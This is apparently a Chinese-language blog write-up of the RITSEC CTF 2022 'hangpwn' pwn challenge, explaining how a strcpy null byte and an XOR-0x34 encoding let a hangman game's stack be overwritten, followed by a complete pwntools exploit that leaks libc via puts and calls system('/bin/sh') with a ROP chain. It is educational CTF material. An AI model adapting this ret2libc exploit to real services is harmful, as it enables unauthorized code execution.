
---
title: RITSEC-CTF-2022-PWN-hangpwn
categories: [CTF]
tags: [wp,pwn]

---
这个比赛很迷惑。感觉大多题很水但是ctftime比重高。这是其中一个有点意思的题<!--more-->。

## 题目分析

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

题目没有开启PIE和canary。减少了不小负担。

题目的主要功能很简单就是猜测字符，主要代码如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rbp
  char *v4; // rax
  char guessed[7]; // [rsp+1h] [rbp-3Fh]
  char guess_buffer[16]; // [rsp+8h] [rbp-38h]
  char buffer[16]; // [rsp+18h] [rbp-28h]
  game_0 state; // [rsp+2Ch] [rbp-14h]
  __int64 v10; // [rsp+38h] [rbp-8h]

  __asm { endbr64 }
  v10 = v3;
  init_game();
  *(_QWORD *)&state.attempts = 0LL;
  *(_DWORD *)&state.words[6][0] = 0;
  *(_QWORD *)buffer = 0LL;
  *(_QWORD *)&buffer[8] = 0LL;
  *(_QWORD *)guess_buffer = 0LL;
  *(_QWORD *)&guess_buffer[8] = 0LL;
  *(_DWORD *)guessed = 0;
  *(_WORD *)&guessed[4] = 0;
  guessed[6] = 0;
  while ( !state.game_over && !state.solved )
  {
    print_game(&state);
    printf("Enter letter: ");
    v4 = fgets(buffer, 16, stdin);
    if ( !v4 )
      return (signed int)v4;
    *((_BYTE *)&v10 + strcspn(buffer, "\n") - 32) = 0;
    if ( strlen(buffer) == 1 )
    {
      char_comp(buffer, "v}zsuag", guessed, state.attempts, 1);
      if ( state.attempts == 6 )
        state.game_over = 1;
      printf("FINAL GUESS\nEnter word: ", "v}zsuag");
      v4 = fgets(guess_buffer, 16, stdin);
      if ( !v4 )
        return (signed int)v4;
      if ( compare_enc(guess_buffer, "v}zsuag", 7) )
        state.solved = 1;
      strcpy(state.words[state.attempts], buffer);
      enc(state.words[state.attempts], 1);
      ++state.attempts;
    }
    else
    {
      puts("\n\tINVALID INPUT");
    }
  }
  print_game(&state);
  return (signed int)v4;
}
```

但是这个功能有点沉于，首先这个猜测在一个循环里进行。但是这个循环由两参数控制`game_over`和`solved`控制，其中一个为真则循环结束。

而这个猜测有两个阶段：

第一个阶段要求输入这个字符，如何这个字符在目的字符里则显现出来。若输入不是一个字符则重新进入第一阶段。

第二阶段是输入一个字符串与目的字符串比较，若比较成功则solved为真。若二阶段进行了6次则game_over为真。

但是在布局时奇怪：

```
*(_DWORD *)&state.words
*(_QWORD *)&state.game_over

```

`state.words`与`state.game_over`两者相临，即state.word结束后的高地址就是`state.game_over`.这样我们就有机会覆盖`state.game_over`.

同时代码中用：

```c
 strcpy(state.words[state.attempts], buffer);
```

来写入words。

而strcpy有个特性：

> strcpy，即string copy（字符串复制）的缩写。
>
> strcpy是[C++](https://baike.baidu.com/item/C%2B%2B/99272)语言的一个标准函数 ，strcpy把含有['\0'](https://baike.baidu.com/item/'\0'/9931274)结束符的字符串复制到另一个[地址空间](https://baike.baidu.com/item/地址空间)，返回值的类型为char*。

换句话说，strcpy会在一个字符串后自动添加上'\x00'.

这样我们就有机会覆盖`state.game_over`

## 漏洞利用

这样算我们输入6次就可以覆盖`state.game_over`那么为什么我们正常运行时，很难发现这个问题？

因为我们在覆盖`state.game_over`后，程序开始了下一次循环，` strcpy(state.words[state.attempts], buffer);`将覆盖`state.game_over`为我们输入的字符。这样'\\x00'就被覆盖掉。因此我们得将`state.game_over`为0进行保留。

但是若我们输入'\x00'，`strlen(buffer) `将判断失败，无法写入`state.words`

.幸好，题目中留个异或：`env()`函数.

```c
void __cdecl enc(char *words, int length)
{
  int i; // [rsp+18h] [rbp-Ch]

  __asm { endbr64 }
  for ( i = 0; i < length; ++i )
    words[i] ^= 0x34u;
}
```

这样我们就可以输入‘\x34’字符来代替‘\x00’.从而无限制写入栈。

剩下就是简单栈溢出。



## exp

```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

'''
@File    :   exp.py
@Time    :   2022/04/3 10:13:59
@Author  :   lexsd6
'''

from pwn import * 
from libcfind import *

local_mote=1
elf='./hangpwn'
e=ELF(elf)
context.arch=e.arch
#context.log_level = 'debug'
ip_port=['',]

debug=lambda gdb_cmd='': gdb.attach(p,gdb_cmd) if local_mote==1 else None

if local_mote==1 :
   p=process(elf)
else :
   p=remote(ip_port[0],ip_port[-1])

"""
0x00000000004016dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004016de : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004016e0 : pop r14 ; pop r15 ; ret
0x00000000004016e2 : pop r15 ; ret
0x00000000004016db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004016df : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004011dd : pop rbp ; ret
0x00000000004016e3 : pop rdi ; ret
0x00000000004016e1 : pop rsi ; pop r15 ; ret
0x00000000004016dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret

"""

xxxx='BINGAUS'
#debug()

for i in  range(10):
	p.sendline(chr(0x34))
	p.recvline()
	p.sendline(chr(0x34))



for i in range(8):
	p.sendline('S')
	p.recvline()
	p.sendline('1')

def wtaddr(addr):
	add=0x100
	for i in range(8):
		xx=addr%add
		p.sendline(chr((addr%add)^0x34))
		addr=addr//add
		p.sendline('lexsd6')

wtaddr(0x00000000004016e3)
wtaddr(e.got['puts'])
wtaddr(e.sym['puts'])
wtaddr(e.sym['main'])
p.recv()
p.sendline('1')
p.recv()
p.sendline('BINGAUS')

libcaddr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
log.info(hex(libcaddr))
x=finder('puts',libcaddr)

for i in  range(10):
	p.sendline(chr(0x34))
	p.recvline()
	p.sendline(chr(0x34))



for i in range(8):
	p.sendline('S')
	p.recvline()
	p.sendline('1'*0x2)


wtaddr(0x00000000004016e3)
wtaddr(x.dump('str_bin_sh'))
wtaddr(0x000000000040101a)
wtaddr(x.dump('system'))
debug()
p.sendline('1')
p.sendline('BINGAUS')

p.interactive()

```

